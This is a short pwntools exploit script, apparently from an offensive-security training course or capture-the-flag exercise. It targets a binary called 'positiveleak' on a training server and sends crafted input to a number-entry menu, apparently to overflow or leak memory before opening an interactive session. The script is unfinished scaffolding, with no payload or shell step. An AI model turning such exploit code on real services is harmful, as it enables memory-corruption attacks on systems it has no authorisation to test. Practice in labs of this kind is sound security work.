from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

libc=ELF("./libc-2.35.so") 
context.log_level = 'debug'
if "REMOTE" not in args:
    p = process("./positiveleak")
    gdb.attach(p, """
        #b *0x00400c14
        
       """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 3003)

def add_numbers(num : int , numbers: list ,p):
    p.sendline(b"0")
    p.recvuntil(b"How many would you add?> ")
    p.sendline(str(num).encode())
    for i in range(num+1):
       p.recvuntil(b"#> ")
       if i== (num/2)+1:
           p.sendline(str(i).encode())
       p.sendline(str(numbers[i]).encode())
    p.recvuntil(b"> ")   

def print_numbers(p):
    p.sendline(b"1")
    print(p.recvuntil(b"**************").decode())
    p.recvuntil(b"> ")

add_numbers(5, [1,2,3,4,5,6], p)
print_numbers(p)
p.interactive()